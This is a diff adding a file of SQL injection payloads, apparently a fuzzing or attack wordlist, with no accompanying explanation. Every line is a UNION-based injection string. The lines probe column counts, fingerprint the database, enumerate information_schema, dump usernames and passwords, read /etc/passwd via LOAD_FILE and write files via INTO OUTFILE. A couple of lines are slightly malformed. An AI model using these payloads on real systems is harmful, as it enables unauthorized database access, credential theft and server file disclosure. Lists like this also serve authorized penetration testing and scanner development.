@@ -1,0 +1,16 @@
+' UNION SELECT NULL --
+' UNION SELECT NULL,NULL --
+' UNION SELECT NULL,NULL,NULL --
+' UNION SELECT NULL,NULL,NULL,NULL --
+' UNION SELECT 1,2,3 --
+' UNION SELECT database(),user(),version() --
+' UNION SELECT table_name,NULL FROM information_schema.tables --
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users' --
+' UNION SELECT username,password FROM users --
+' UNION SELECT 1,2,3,4,5,6,7,8,9,0 --
+' UNION SELECT @version,@@version_comment,@@hostname --
+' UNION SELECT schema_name,default_character_set_name FROM information_schema.schemata --
+' UNION SELECT table_schema,table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%pass%' --
+' UNION SELECT 1,2,GROUP_CONCAT(username,0x3a,password) FROM users --
+' UNION SELECT 1,2,LOAD_FILE('/etc/passwd') --
+' UNION SELECT 1,2,INTO OUTFILE '/tmp/out.txt' --
